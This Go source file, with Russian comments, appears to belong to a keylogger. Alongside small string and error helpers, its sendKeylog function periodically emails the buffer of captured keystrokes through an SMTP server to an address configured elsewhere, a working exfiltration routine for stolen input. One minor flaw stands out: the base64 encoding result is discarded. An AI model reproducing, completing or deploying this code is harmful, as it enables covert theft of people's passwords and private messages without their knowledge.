package components

import (
	"log"
	"strings"
	"unicode"
	"time"
	"math/rand"
	"net/smtp"
)

func ChekErrors(err error)  {
	if err != nil{
		log.Fatal(err)
	}
}

func FormatString(str string ) string {

	for i, count := range str {
		if count == 92 { // 92 косая обатная черта
			return str[i+1:len(str)-2]
		}
	}
	return str
}
// разобраться что за ботва
func randInt(min int, max int) int {
	rand.Seed(time.Now().UTC().UnixNano())
	return min + rand.Intn(max-min)
}

// разобраться что за ботва
func stripSpaces(str string) string {
	return strings.Map(func(r rune) rune {
		if unicode.IsSpace(r) {
			return -1
		}
		return r
	}, str)
}

// отправка данных keylogger
func sendKeylog()  {
	if tmpKeylog != "" {
		time.Sleep(time.Duration(keyloggerInterval)* time.Minute)
		base64Encode(tmpKeylog)

		auth := smtp.PlainAuth(identetyMail, userNameMail, passwordMail, hostSmtp)
		err := smtp.SendMail(addrMail, auth, fromMail, []string{toMail}, []byte(tmpKeylog))
		if err != nil {
			ChekErrors(err)
			}
		}
	}
